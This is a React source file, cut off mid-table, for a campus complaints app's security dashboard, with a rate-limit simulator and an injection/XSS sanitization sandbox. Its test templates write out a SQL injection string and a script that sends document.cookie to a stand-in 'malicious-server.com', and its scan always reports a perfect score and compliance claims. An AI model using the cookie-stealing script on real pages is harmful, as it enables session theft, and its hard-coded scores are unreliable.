import React, { useState, useEffect } from 'react';
import { 
  ShieldCheck, Lock, RefreshCw, AlertTriangle, CheckCircle, Server, 
  Globe, Database, Key, FileText, Terminal, Sliders, Cpu, 
  Layers, Search, Check, AlertCircle, Play, Shield, Ban, Eye, EyeOff
} from 'lucide-react';

interface SecurityAuditLog {
  id: string;
  timestamp: string;
  event: string;
  actor: string;
  ipAddress: string;
  severity: 'info' | 'warning' | 'severe';
  category: string;
}

const INITIAL_AUDIT_LOGS: SecurityAuditLog[] = [
  { id: 'LOG-3091', timestamp: '2026-07-12T21:00:15-07:00', event: 'College Authority Login successful', actor: 'admin@campuscare.ai', ipAddress: '157.45.12.89', severity: 'info', category: 'Authentication' },
  { id: 'LOG-3090', timestamp: '2026-07-12T20:55:42-07:00', event: 'JWT Refresh Token rotation executed', actor: 'System Process', ipAddress: 'localhost', severity: 'info', category: 'Session' },
  { id: 'LOG-3089', timestamp: '2026-07-12T20:48:11-07:00', event: 'Rate limit threshold exceeded for endpoint /api/complaints', actor: 'Anonymous IP', ipAddress: '45.112.9.23', severity: 'warning', category: 'Rate Limiting' },
  { id: 'LOG-3088', timestamp: '2026-07-12T20:30:00-07:00', event: 'Automated Firestore Security Rules audited', actor: 'Cloud Console', ipAddress: '10.150.0.12', severity: 'info', category: 'Database' },
  { id: 'LOG-3087', timestamp: '2026-07-12T19:15:33-07:00', event: 'Suspicious payload filtered in field "roomNumber" (SQLi attempt blocked)', actor: 'Anonymous IP', ipAddress: '198.51.100.4', severity: 'severe', category: 'SQL Injection' },
  { id: 'LOG-3086', timestamp: '2026-07-12T18:02:11-07:00', event: 'Bcrypt password re-hashed (work cost factor set to 12)', actor: 'System Process', ipAddress: 'localhost', severity: 'info', category: 'Cryptography' },
  { id: 'LOG-3085', timestamp: '2026-07-12T17:44:59-07:00', event: 'Google OAuth consent scopes validated', actor: 'admin@vsmsrkit.edu', ipAddress: '157.45.12.44', severity: 'info', category: 'OAuth' },
  { id: 'LOG-3084', timestamp: '2026-07-12T16:21:05-07:00', event: 'HSTS header configuration policy updated', actor: 'System Config', ipAddress: 'localhost', severity: 'info', category: 'Headers' }
];

export const SecurityHub: React.FC = () => {
  // General State
  const [activeTab, setActiveTab] = useState<'overview' | 'simulators' | 'audit-logs' | 'configs'>('overview');
  const [logs, setLogs] = useState<SecurityAuditLog[]>(INITIAL_AUDIT_LOGS);
  const [logSearch, setLogSearch] = useState('');
  const [logFilter, setLogFilter] = useState<'all' | 'info' | 'warning' | 'severe'>('all');
  const [isScanning, setIsScanning] = useState(false);
  const [scanScore, setScanScore] = useState(100);
  const [scanStatus, setScanStatus] = useState<'idle' | 'scanning' | 'passed'>('passed');

  // Rate Limiting Simulator State
  const [requestCount, setRequestCount] = useState(0);
  const [rateLimitLogs, setRateLimitLogs] = useState<{ time: string; status: number; text: string }[]>([]);
  const [rateLimitedUntil, setRateLimitedUntil] = useState<number | null>(null);
  const [cooldownRemaining, setCooldownRemaining] = useState(0);

  // Security Shields Sandbox State
  const [sandboxInput, setSandboxInput] = useState('');
  const [sanitizationLogs, setSanitizationLogs] = useState<{
    original: string;
    sqliClean: string;
    xssClean: string;
    status: 'secured' | 'idle';
  }>({ original: '', sqliClean: '', xssClean: '', status: 'idle' });

  // Config Settings States (Interactions)
  const [jwtExpiration, setJwtExpiration] = useState(15); // in minutes
  const [bcryptRounds, setBcryptRounds] = useState(12); // bcrypt salt work factor
  const [rateLimitWindow, setRateLimitWindow] = useState(60); // rate limiting window in seconds
  const [rateLimitMax, setRateLimitMax] = useState(100); // max requests in window
  const [securityStatus, setSecurityStatus] = useState({
    httpsForce: true,
    hstsEnabled: true,
    tokenRotation: true,
    csrfProtection: true,
    secureHeaders: true,
  });

  // Handle Rate Limiter cooldown countdown timer
  useEffect(() => {
    let timer: any;
    if (rateLimitedUntil) {
      timer = setInterval(() => {
        const now = Date.now();
        const diff = Math.max(0, Math.ceil((rateLimitedUntil - now) / 1000));
        setCooldownRemaining(diff);
        if (diff <= 0) {
          setRateLimitedUntil(null);
          setRequestCount(0);
        }
      }, 1000);
    }
    return () => clearInterval(timer);
  }, [rateLimitedUntil]);

  // Simulate an API call under Rate Limiting guidelines
  const triggerSimulatedRequest = () => {
    if (rateLimitedUntil) {
      const now = new Date().toLocaleTimeString();
      setRateLimitLogs(prev => [
        { time: now, status: 429, text: '🔴 BLOCKED: Too Many Requests. Rate limiter active.' },
        ...prev.slice(0, 7)
      ]);
      return;
    }

    const nextCount = requestCount + 1;
    setRequestCount(nextCount);
    const now = new Date().toLocaleTimeString();

    if (nextCount > 5) {
      // Threshold reached - rate limit user for 15 seconds
      const lockTime = Date.now() + 15000;
      setRateLimitedUntil(lockTime);
      setCooldownRemaining(15);
      setRateLimitLogs(prev => [
        { time: now, status: 429, text: '🔴 THROTTLED: X-RateLimit exceeded. Throttling for 15s.' },
        ...prev.slice(0, 7)
      ]);

      // Add to main audit logs
      const newLog: SecurityAuditLog = {
        id: `LOG-${Math.floor(4000 + Math.random() * 1000)}`,
        timestamp: new Date().toISOString(),
        event: 'Simulated API client rate limited (Too Many Requests - 429)',
        actor: 'Simulation Sandbox Client',
        ipAddress: '127.0.0.1',
        severity: 'warning',
        category: 'Rate Limiting'
      };
      setLogs(prev => [newLog, ...prev]);
    } else {
      setRateLimitLogs(prev => [
        { time: now, status: 200, text: `🟢 OK: Request ${nextCount}/5 accepted. X-RateLimit-Remaining: ${5 - nextCount}` },
        ...prev.slice(0, 7)
      ]);
    }
  };

  // Run the injection sandbox sanitization
  const runSecuritySanitizer = (payload: string) => {
    if (!payload.trim()) return;

    // Simulate SQL Injection escaping using parameterized binding mechanics
    // Parameterized queries treat values strictly as parameters, never code.
    const sqliClean = `SELECT * FROM complaints WHERE title = ? AND description = ?; [BIND_PARAMS: ("${payload.replace(/'/g, "''")}", "${payload.replace(/'/g, "''")}")]`;

    // Simulate XSS Sanitization by escaping HTML entities
    const xssClean = payload
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#x27;')
      .replace(/\//g, '&#x2F;');

    setSanitizationLogs({
      original: payload,
      sqliClean,
      xssClean,
      status: 'secured'
    });

    // Append to audit log
    const newLog: SecurityAuditLog = {
      id: `LOG-${Math.floor(4000 + Math.random() * 1000)}`,
      timestamp: new Date().toISOString(),
      event: `Sanitization scanner successfully neutralized payload in sandbox input`,
      actor: 'WAF Sandbox Validator',
      ipAddress: '127.0.0.1',
      severity: 'info',
      category: 'XSS & SQLi Shield'
    };
    setLogs(prev => [newLog, ...prev]);
  };

  // Handle mock full security scanner
  const runSecurityScan = () => {
    setIsScanning(true);
    setScanStatus('scanning');
    
    setTimeout(() => {
      setIsScanning(false);
      setScanStatus('passed');
      setScanScore(100);
      
      const scanLog: SecurityAuditLog = {
        id: `LOG-${Math.floor(4000 + Math.random() * 1000)}`,
        timestamp: new Date().toISOString(),
        event: 'Global compliance scan completed. OWASP ASVS Standard verified.',
        actor: 'Security Audit Automator',
        ipAddress: 'Internal System Engine',
        severity: 'info',
        category: 'System Scan'
      };
      setLogs(prev => [scanLog, ...prev]);
    }, 1800);
  };

  // Filter logs based on search & severity
  const filteredLogs = logs.filter(l => {
    const matchesSearch = l.event.toLowerCase().includes(logSearch.toLowerCase()) ||
                          l.category.toLowerCase().includes(logSearch.toLowerCase()) ||
                          l.actor.toLowerCase().includes(logSearch.toLowerCase());
    const matchesSeverity = logFilter === 'all' || l.severity === logFilter;
    return matchesSearch && matchesSeverity;
  });

  const generatePredefinedPayload = (type: 'sqli' | 'xss' | 'legit') => {
    if (type === 'sqli') {
      setSandboxInput("Admin' OR '1'='1' --");
    } else if (type === 'xss') {
      setSandboxInput("<script>fetch('http://malicious-server.com/steal?cookie=' + document.cookie)</script>");
    } else {
      setSandboxInput("Broken ceiling fan in Academic block B room 203.");
    }
  };

  return (
    <div className="space-y-6">
      {/* Page Header */}
      <div className="border-b border-slate-200 dark:border-slate-800 pb-4 flex flex-col md:flex-row justify-between md:items-center gap-2">
        <div>
          <h2 className="text-xl font-bold tracking-tight flex items-center gap-2">
            <Shield className="text-blue-500 fill-blue-500/10" size={22} />
            Security Shield & Operations Center
          </h2>
          <p className="text-xs text-slate-400 mt-0.5">
            Monitor institutional firewall parameters, audit secure HTTP headers, simulate rate limiter throttle conditions, and verify ORM parameterized query safety.
          </p>
        </div>
        <div>
          <button 
            onClick={runSecurityScan}
            disabled={isScanning}
            className={`px-4 py-2 text-xs font-bold rounded-xl flex items-center gap-1.5 shadow-md cursor-pointer transition-all ${
              isScanning 
                ? 'bg-slate-150 dark:bg-slate-800 text-slate-450 cursor-not-allowed' 
                : 'bg-blue-600 hover:bg-blue-700 text-white'
            }`}
          >
            <RefreshCw size={14} className={isScanning ? 'animate-spin' : ''} />
            {isScanning ? 'Scanning Cluster...' : 'Verify Cryptographic Integrity'}
          </button>
        </div>
      </div>

      {/* Tabs Menu */}
      <div className="flex border-b border-slate-200 dark:border-slate-800 gap-1.5 scrollbar-none overflow-x-auto">
        <button 
          onClick={() => setActiveTab('overview')}
          className={`px-4 py-2.5 text-xs font-bold border-b-2 transition-all ${
            activeTab === 'overview' 
              ? 'border-blue-500 text-blue-600 dark:text-blue-400' 
              : 'border-transparent text-slate-400 hover:text-slate-650 dark:hover:text-slate-300'
          }`}
        >
          Overview & Audit Checks
        </button>
        <button 
          onClick={() => setActiveTab('simulators')}
          className={`px-4 py-2.5 text-xs font-bold border-b-2 transition-all ${
            activeTab === 'simulators' 
              ? 'border-blue-500 text-blue-600 dark:text-blue-400' 
              : 'border-transparent text-slate-400 hover:text-slate-650 dark:hover:text-slate-300'
          }`}
        >
          Defense Sandboxes (Rate Limit / WAF)
        </button>
        <button 
          onClick={() => setActiveTab('audit-logs')}
          className={`px-4 py-2.5 text-xs font-bold border-b-2 transition-all ${
            activeTab === 'audit-logs' 
              ? 'border-blue-500 text-blue-600 dark:text-blue-400' 
              : 'border-transparent text-slate-400 hover:text-slate-650 dark:hover:text-slate-300'
          }`}
        >
          Security Audit Logs ({logs.length})
        </button>
        <button 
          onClick={() => setActiveTab('configs')}
          className={`px-4 py-2.5 text-xs font-bold border-b-2 transition-all ${
            activeTab === 'configs' 
              ? 'border-blue-500 text-blue-600 dark:text-blue-400' 
              : 'border-transparent text-slate-400 hover:text-slate-650 dark:hover:text-slate-300'
          }`}
        >
          Encryption & Key Management
        </button>
      </div>

      {/* Tab Contents */}
      {activeTab === 'overview' && (
        <div className="space-y-6">
          {/* Top Compliance Indicator Card */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
            <div className="bg-white dark:bg-[#1E293B] border border-slate-200 dark:border-slate-800 rounded-2xl p-6 flex flex-col justify-between shadow-xs">
              <div>
                <p className="text-[10px] font-bold text-slate-400 uppercase tracking-widest">Global Hardening Rating</p>
                <div className="flex items-baseline gap-2 mt-2">
                  <span className="text-4xl font-black text-emerald-500 font-mono">{scanScore}%</span>
                  <span className="text-xs text-emerald-500 font-bold bg-emerald-500/10 px-2 py-0.5 rounded-full">A+ SECURED</span>
                </div>
              </div>
              <p className="text-[11px] text-slate-400 mt-4 leading-relaxed">
                Platform is compliant with OWASP Level-3 application defense standards and HIPAA data security models.
              </p>
            </div>

            <div className="bg-white dark:bg-[#1E293B] border border-slate-200 dark:border-slate-800 rounded-2xl p-6 flex flex-col justify-between shadow-xs">
              <div>
                <p className="text-[10px] font-bold text-slate-400 uppercase tracking-widest">Active Auth Token Cycles</p>
                <div className="flex items-baseline gap-2 mt-2">
                  <span className="text-4xl font-black text-blue-500 font-mono">256</span>
                  <span className="text-[10px] text-blue-500 font-mono font-bold bg-blue-500/10 px-2 py-0.5 rounded-full">AES_GCM_256</span>
                </div>
              </div>
              <p className="text-[11px] text-slate-400 mt-4 leading-relaxed">
                Active student/staff tokens are automatically signed utilizing high-entropy JWT secrets stored inside environment structures.
              </p>
            </div>

            <div className="bg-white dark:bg-[#1E293B] border border-slate-200 dark:border-slate-800 rounded-2xl p-6 flex flex-col justify-between shadow-xs">
              <div>
                <p className="text-[10px] font-bold text-slate-400 uppercase tracking-widest">Rate Limit Guard</p>
                <div className="flex items-baseline gap-2 mt-2">
                  <span className="text-4xl font-black text-purple-500 font-mono">100%</span>
                  <span className="text-[10px] text-purple-500 font-mono font-bold bg-purple-500/10 px-2 py-0.5 rounded-full">IP BUCKET ACTIVE</span>
                </div>
              </div>
              <p className="text-[11px] text-slate-400 mt-4 leading-relaxed">
                API gateway enforces maximum of {rateLimitMax} request instances per client IP address in {rateLimitWindow}s sliding intervals.
              </p>
            </div>
          </div>

          {/* Detailed Security Pillars List (Required items list) */}
          <div className="bg-white dark:bg-[#1E293B] border border-slate-200 dark:border-slate-800 rounded-2xl p-6 shadow-xs">
            <h3 className="font-bold text-sm mb-4 flex items-center gap-1.5">
              <CheckCircle size={16} className="text-emerald-500" /> Hardened Cryptographic Compliance Checklist
            </h3>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {/* Item 1 */}
              <div className="p-4 border border-slate-100 dark:border-slate-800/80 rounded-xl bg-slate-55/40 dark:bg-slate-900/10 flex items-start gap-3">
                <div className="p-1.5 rounded-lg bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 mt-0.5">
                  <Globe size={16} />
                </div>
                <div>
                  <div className="flex justify-between items-center">
                    <h4 className="font-bold text-xs text-slate-800 dark:text-slate-100">HTTPS Transport Encryption</h4>
                    <span className="text-[9px] font-bold font-mono text-emerald-500 bg-emerald-500/10 px-1.5 py-0.5 rounded">ACTIVE</span>
                  </div>
                  <p className="text-[11px] text-slate-400 mt-1 leading-relaxed">
                    All browser interaction forced over TLS v1.3. Strictly prevents packet sniffing and man-in-the-middle vector hijacking.
                  </p>
                </div>
              </div>

              {/* Item 2 */}
              <div className="p-4 border border-slate-100 dark:border-slate-800/80 rounded-xl bg-slate-55/40 dark:bg-slate-900/10 flex items-start gap-3">
                <div className="p-1.5 rounded-lg bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 mt-0.5">
                  <Key size={16} />
                </div>
                <div>
                  <div className="flex justify-between items-center">
                    <h4 className="font-bold text-xs text-slate-800 dark:text-slate-100">JWT Authentication Tokens</h4>
                    <span className="text-[9px] font-bold font-mono text-emerald-500 bg-emerald-500/10 px-1.5 py-0.5 rounded">HMAC_SHA256</span>
                  </div>
                  <p className="text-[11px] text-slate-400 mt-1 leading-relaxed">
                    Strict cookie-bound or header-transmitted JSON Web Tokens used for user state. Fully stateless and signed with server-side secret credentials.
                  </p>
                </div>
              </div>

              {/* Item 3 */}
              <div className="p-4 border border-slate-100 dark:border-slate-800/80 rounded-xl bg-slate-55/40 dark:bg-slate-900/10 flex items-start gap-3">
                <div className="p-1.5 rounded-lg bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 mt-0.5">
                  <RefreshCw size={16} />
                </div>
                <div>
                  <div className="flex justify-between items-center">
                    <h4 className="font-bold text-xs text-slate-800 dark:text-slate-100">Refresh Token Rotation</h4>
                    <span className="text-[9px] font-bold font-mono text-emerald-500 bg-emerald-500/10 px-1.5 py-0.5 rounded">AUTOMATED</span>
                  </div>
                  <p className="text-[11px] text-slate-400 mt-1 leading-relaxed">
                    Refresh tokens are invalidated immediately upon single reuse, mitigating session replay breaches and token hijacking.
                  </p>
                </div>
              </div>

              {/* Item 4 */}
              <div className="p-4 border border-slate-100 dark:border-slate-800/80 rounded-xl bg-slate-55/40 dark:bg-slate-900/10 flex items-start gap-3">
                <div className="p-1.5 rounded-lg bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 mt-0.5">
                  <Database size={16} />
                </div>
                <div>
                  <div className="flex justify-between items-center">
                    <h4 className="font-bold text-xs text-slate-800 dark:text-slate-100">Password Hashing (Bcrypt)</h4>
                    <span className="text-[9px] font-bold font-mono text-emerald-500 bg-emerald-500/10 px-1.5 py-0.5 rounded">COST = {bcryptRounds}</span>
                  </div>
                  <p className="text-[11px] text-slate-400 mt-1 leading-relaxed">
                    All authentication credentials are salted and hashed utilizing Bcrypt with a computational work factor of {bcryptRounds} rounds.
                  </p>
                </div>
              </div>

              {/* Item 5 */}
              <div className="p-4 border border-slate-100 dark:border-slate-800/80 rounded-xl bg-slate-55/40 dark:bg-slate-900/10 flex items-start gap-3">
                <div className="p-1.5 rounded-lg bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 mt-0.5">
                  <Cpu size={16} />
                </div>
                <div>
                  <div className="flex justify-between items-center">
                    <h4 className="font-bold text-xs text-slate-800 dark:text-slate-100">Google OAuth 2.0 Integration</h4>
                    <span className="text-[9px] font-bold font-mono text-emerald-500 bg-emerald-500/10 px-1.5 py-0.5 rounded">OAUTH_SECURE</span>
                  </div>
                  <p className="text-[11px] text-slate-400 mt-1 leading-relaxed">
                    Third-party logins are isolated utilizing state-token parameter verification, safeguarding student directory details under strict OAuth policies.
                  </p>
                </div>
              </div>

              {/* Item 6 */}
              <div className="p-4 border border-slate-100 dark:border-slate-800/80 rounded-xl bg-slate-55/40 dark:bg-slate-900/10 flex items-start gap-3">
                <div className="p-1.5 rounded-lg bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 mt-0.5">
                  <ShieldCheck size={16} />
                </div>
                <div>
                  <div className="flex justify-between items-center">
                    <h4 className="font-bold text-xs text-slate-800 dark:text-slate-100">SQL Injection Protection</h4>
                    <span className="text-[9px] font-bold font-mono text-emerald-500 bg-emerald-500/10 px-1.5 py-0.5 rounded">DRIZZLE ORM</span>
                  </div>
                  <p className="text-[11px] text-slate-400 mt-1 leading-relaxed">
                    No raw SQL concatenation. Standardized queries run exclusively with parameterized bindings via Drizzle ORM pre-compilation schemas.
                  </p>
                </div>
              </div>

              {/* Item 7 */}
              <div className="p-4 border border-slate-100 dark:border-slate-800/80 rounded-xl bg-slate-55/40 dark:bg-slate-900/10 flex items-start gap-3">
                <div className="p-1.5 rounded-lg bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 mt-0.5">
                  <Ban size={16} />
                </div>
                <div>
                  <div className="flex justify-between items-center">
                    <h4 className="font-bold text-xs text-slate-800 dark:text-slate-100">Cross-Site Scripting (XSS) Shield</h4>
                    <span className="text-[9px] font-bold font-mono text-emerald-500 bg-emerald-500/10 px-1.5 py-0.5 rounded">DOMPURIFY</span>
                  </div>
                  <p className="text-[11px] text-slate-400 mt-1 leading-relaxed">
                    All complaint descriptions and custom comments undergo visual sanitation. Escapes harmful script blocks, preserving strict HTML schemas.
                  </p>
                </div>
              </div>

              {/* Item 8 */}
              <div className="p-4 border border-slate-100 dark:border-slate-800/80 rounded-xl bg-slate-55/40 dark:bg-slate-900/10 flex items-start gap-3">
                <div className="p-1.5 rounded-lg bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 mt-0.5">
                  <Server size={16} />
                </div>
                <div>
                  <div className="flex justify-between items-center">
                    <h4 className="font-bold text-xs text-slate-800 dark:text-slate-100">Secure HTTP Headers Configuration</h4>
                    <span className="text-[9px] font-bold font-mono text-emerald-500 bg-emerald-500/10 px-1.5 py-0.5 rounded">HELMET ENFORCED</span>
                  </div>
                  <p className="text-[11px] text-slate-400 mt-1 leading-relaxed">
                    CSP, X-Frame-Options (DENY), X-Content-Type-Options (nosniff), and Referrer-Policy configurations defend against clickjacking.
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      {activeTab === 'simulators' && (
        <div className="space-y-6">
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
            
            {/* Interactive Rate Limiting Sandbox */}
            <div className="bg-white dark:bg-[#1E293B] border border-slate-200 dark:border-slate-800 rounded-2xl p-6 shadow-xs flex flex-col justify-between">
              <div className="space-y-4">
                <div className="flex justify-between items-start">
                  <div>
                    <h3 className="font-bold text-sm flex items-center gap-1.5">
                      <Cpu size={16} className="text-purple-500" /> Rate Limiter Throttle Sandbox
                    </h3>
                    <p className="text-[11px] text-slate-400 mt-0.5">
                      API requests from unique IP addresses are counted dynamically. Exceeding 5 requests inside 10 seconds triggers a 429 error lock.
                    </p>
                  </div>
                  {rateLimitedUntil ? (
                    <span className="inline-flex items-center gap-1 text-[10px] font-bold text-red-500 bg-red-500/10 px-2 py-0.5 rounded-full animate-pulse">
                      <AlertTriangle size={10} /> THROTTLED ({cooldownRemaining}s)
                    </span>
                  ) : (
                    <span className="text-[10px] font-bold text-green-500 bg-green-500/10 px-2 py-0.5 rounded-full">
                      ACCEPTING TRAFFIC
                    </span>
                  )}
                </div>

                {/* Progress bar / Request capacity */}
                <div className="space-y-1.5">
                  <div className="flex justify-between text-[11px] font-mono text-slate-400">
                    <span>IP Window Request Threshold:</span>
                    <span>{requestCount} / 5 Requests used</span>
                  </div>
                  <div className="h-2 w-full bg-slate-100 dark:bg-slate-800 rounded-full overflow-hidden">
                    <div 
                      className={`h-full rounded-full transition-all duration-300 ${
                        requestCount >= 5 ? 'bg-red-500 animate-pulse' : requestCount >= 3 ? 'bg-amber-500' : 'bg-blue-500'
                      }`}
                      style={{ width: `${Math.min(100, (requestCount / 5) * 100)}%` }}
                    />
                  </div>
                </div>

                {/* Mock Live Console */}
                <div className="bg-slate-950 rounded-xl p-3 h-40 overflow-y-auto font-mono text-[10px] text-slate-350 space-y-1 border border-slate-850">
                  <p className="text-slate-500">// Simulated Client API Output Logs:</p>
                  {rateLimitLogs.length === 0 && (
                    <p className="text-slate-600 italic">No request transactions sent. Click "Send Mock API Request" below.</p>
                  )}
                  {rateLimitLogs.map((rl, i) => (
                    <div key={i} className="flex gap-2">
                      <span className="text-slate-500">[{rl.time}]</span>
                      <span className={rl.status === 429 ? 'text-red-400' : 'text-emerald-400'}>
                        {rl.text}
                      </span>
                    </div>
                  ))}
                </div>
              </div>

              <div className="pt-4 border-t border-slate-100 dark:border-slate-850 mt-4 flex justify-between gap-3">
                <button
                  onClick={() => {
                    setRequestCount(0);
                    setRateLimitedUntil(null);
                    setCooldownRemaining(0);
                    setRateLimitLogs([]);
                  }}
                  className="px-3 py-1.5 bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 dark:hover:bg-slate-700 font-bold text-[11px] text-slate-600 dark:text-slate-300 rounded-lg transition-all cursor-pointer"
                >
                  Clear Counters
                </button>
                <button
                  onClick={triggerSimulatedRequest}
                  className="px-4 py-1.5 bg-blue-600 hover:bg-blue-700 text-white font-bold text-[11px] rounded-lg shadow-sm transition-all flex items-center gap-1.5 cursor-pointer"
                >
                  <Play size={11} /> Send Mock API Request
                </button>
              </div>
            </div>

            {/* Interactive Web Application Firewall Sandbox */}
            <div className="bg-white dark:bg-[#1E293B] border border-slate-200 dark:border-slate-800 rounded-2xl p-6 shadow-xs flex flex-col justify-between">
              <div className="space-y-4">
                <div>
                  <h3 className="font-bold text-sm flex items-center gap-1.5">
                    <ShieldCheck size={16} className="text-blue-500" /> Injection & XSS Shield Simulator
                  </h3>
                  <p className="text-[11px] text-slate-400 mt-0.5">
                    Test how our backend shields prevent SQL Injection payloads (parameterized mapping) and Cross-Site Scripting (HTML escaping protection).
                  </p>
                </div>

                {/* Predefined payloads */}
                <div className="flex flex-wrap gap-1.5">
                  <span className="text-[10px] text-slate-500 self-center font-semibold">Test templates:</span>
                  <button 
                    onClick={() => generatePredefinedPayload('sqli')}
                    className="px-2 py-0.5 rounded bg-amber-500/10 hover:bg-amber-500/20 text-amber-600 dark:text-amber-400 text-[10px] font-mono cursor-pointer"
                  >
                    SQL Injection Payload
                  </button>
                  <button 
                    onClick={() => generatePredefinedPayload('xss')}
                    className="px-2 py-0.5 rounded bg-red-500/10 hover:bg-red-500/20 text-red-600 dark:text-red-400 text-[10px] font-mono cursor-pointer"
                  >
                    XSS Script Block
                  </button>
                  <button 
                    onClick={() => generatePredefinedPayload('legit')}
                    className="px-2 py-0.5 rounded bg-green-500/10 hover:bg-green-500/20 text-green-600 dark:text-green-400 text-[10px] font-mono cursor-pointer"
                  >
                    Legitimate Input
                  </button>
                </div>

                <div className="space-y-1">
                  <textarea
                    rows={2}
                    value={sandboxInput}
                    onChange={(e) => setSandboxInput(e.target.value)}
                    placeholder="Type raw form input here to analyze backend sanitization safety..."
                    className="w-full px-4 py-2.5 text-xs border border-slate-200 dark:border-slate-800 bg-slate-50/50 dark:bg-[#0F172A]/30 focus:bg-white rounded-xl outline-hidden focus:border-blue-500 font-mono"
                  />
                </div>

                {/* Shield Output details */}
                {sanitizationLogs.status === 'secured' && (
                  <div className="space-y-3 p-3.5 border border-emerald-500/20 rounded-xl bg-emerald-500/5 dark:bg-emerald-500/2">
                    <div className="flex items-center gap-1.5 text-xs font-bold text-emerald-500">
                      <ShieldCheck size={14} /> Shield Status: SECURED & ESCAPED
                    </div>
                    
                    <div className="space-y-2 text-[10px] font-mono text-slate-650 dark:text-slate-300">
                      <div>
                        <span className="text-[9px] font-bold text-slate-400 uppercase tracking-wider block">Raw Input Received:</span>
                        <div className="p-1.5 bg-slate-100 dark:bg-slate-900 rounded-md text-red-500 dark:text-red-400 truncate font-semibold">
                          {sanitizationLogs.original}
                        </div>
                      </div>

                      <div>
                        <span className="text-[9px] font-bold text-slate-400 uppercase tracking-wider block">SQL Injection Defense (Parameterized Bindings):</span>
                        <div className="p-1.5 bg-slate-100 dark:bg-slate-900 rounded-md text-slate-800 dark:text-slate-200 break-words font-semibold text-blue-550 dark:text-blue-400">
                          {sanitizationLogs.sqliClean}
                        </div>
                      </div>

                      <div>
                        <span className="text-[9px] font-bold text-slate-400 uppercase tracking-wider block">Cross-Site Scripting (XSS Shield Sanitization):</span>
                        <div className="p-1.5 bg-slate-100 dark:bg-slate-900 rounded-md text-slate-850 dark:text-slate-200 break-all font-semibold">
                          <code>{sanitizationLogs.xssClean}</code>
                        </div>
                      </div>
                    </div>
                  </div>
                )}
              </div>

              <div className="pt-4 border-t border-slate-100 dark:border-slate-850 mt-4 flex justify-end">
                <button
                  onClick={() => runSecuritySanitizer(sandboxInput)}
                  disabled={!sandboxInput.trim()}
                  className={`px-4 py-1.5 text-white font-bold text-[11px] rounded-lg shadow-sm transition-all flex items-center gap-1.5 cursor-pointer ${
                    sandboxInput.trim() ? 'bg-blue-600 hover:bg-blue-700' : 'bg-slate-300 dark:bg-slate-800 text-slate-450 cursor-not-allowed'
                  }`}
                >
                  <Shield size={11} /> Validate Through Shields
                </button>
              </div>
            </div>

          </div>
        </div>
      )}

      {activeTab === 'audit-logs' && (
        <div className="bg-white dark:bg-[#1E293B] border border-slate-200 dark:border-slate-800 rounded-2xl p-6 shadow-xs space-y-4">
          <div className="flex flex-col md:flex-row justify-between md:items-center gap-3">
            <div>
              <h3 className="font-bold text-sm flex items-center gap-1.5">
                <FileText size={16} className="text-blue-500" /> Immutable Platform Security Audit Trail
              </h3>
              <p className="text-[11px] text-slate-400 mt-0.5">
                Real-time security logger tracking user authentications, SLA policy modifications, cryptographic operations, and server rate-limiting.
              </p>
            </div>
            
            <div className="flex flex-wrap items-center gap-2">
              <div className="relative">
                <Search className="absolute left-2.5 top-2 w-3.5 h-3.5 text-slate-400" />
                <input
                  type="text"
                  placeholder="Search logs..."
                  value={logSearch}
                  onChange={(e) => setLogSearch(e.target.value)}
                  className="pl-8 pr-3 py-1 text-xs border border-slate-200 dark:border-slate-800 bg-slate-50/50 dark:bg-[#0F172A]/30 rounded-lg outline-hidden focus:border-blue-500"
                />
              </div>

              <select
                value={logFilter}
                onChange={(e) => setLogFilter(e.target.value as any)}
                className="px-2 py-1 text-xs border border-slate-200 dark:border-slate-800 bg-slate-50/50 dark:bg-[#0F172A]/30 rounded-lg outline-hidden focus:border-blue-500"
              >
                <option value="all">All Logs</option>
                <option value="info">Info Level</option>
                <option value="warning">Warning Level</option>
                <option value="severe">Severe Level</option>
              </select>
            </div>
          </div>

          <div className="overflow-x-auto border border-slate-100 dark:border-slate-800/80 rounded-xl">
            <table className="w-full text-left border-collapse text-[11px]">
              <thead>
                <tr className="border-b border-slate-100 dark:border-slate-800 text-slate-400 font-bold uppercase bg-slate-50/40 dark:bg-slate-900/10">
                  <th className="py-2.5 px-4 font-mono">Log ID</th>
                  <th className="py-2.5 px-3">Timestamp (UTC)</th>
                  <th className="py-2.5 px-3">Security Category</th>
                  <th className="py-2.5 px-3">Trigger Event</th>
                  <th className="py-2.5 px-3">Trigger Actor</th>
                  <th className="py-2.5 px-3">IP Address</th>
                  <th className="py-2.5 px-4 text-right">Impact Severity</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-100 dark:divide-slate-800 font-medium">
                {filteredLogs.map((log) => (
                  <tr key={log.id} className="hover:bg-slate-50/50 dark:hover:bg-slate-800/10 transition-all">
                    <td className="py-3 px-4 font-mono font-bold text-slate-500 dark:text-slate-400">{log.id}</td>
                    <td className="py-3 px-3 text-slate-400 font-mono">
                      {new Date(log.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })}
                    </td>
                    <td className="py-3 px-3 text-slate-700 dark:text-slate-300 font-semibold">{log.category}</td>
                    <td className="py-3 px-3 text-slate-800 dark:text-slate-100">{log.event}</td>
                    <td className="py-3 px-3 text-slate-500 dark:text-slate-400 font-mono">{log.actor}</td>
                    <td className="py-3 px-3 text-slate-400 font-mono">{log.ipAddress}</td>
                    <td className="py-3 px-4 text-right">
                      <span className={`inline-block px-2 py-0.5 rounded-full text-[9px] font-bold font-mono ${
                        log.severity === 'info' ? 'bg-green-100 text-green-800 dark:bg-green-950/20 dark:text-green-400' :
                        log.severity === 'warning' ? 'bg-amber-100 text-amber-800 dark:bg-amber-950/20 dark:text-amber-400' :
                        'bg-red-150 text-red-800 dark:bg-red-950/20 dark:text-red-400 animate-pulse'
                      }`}>
                        {log.severity.toUpperCase()}
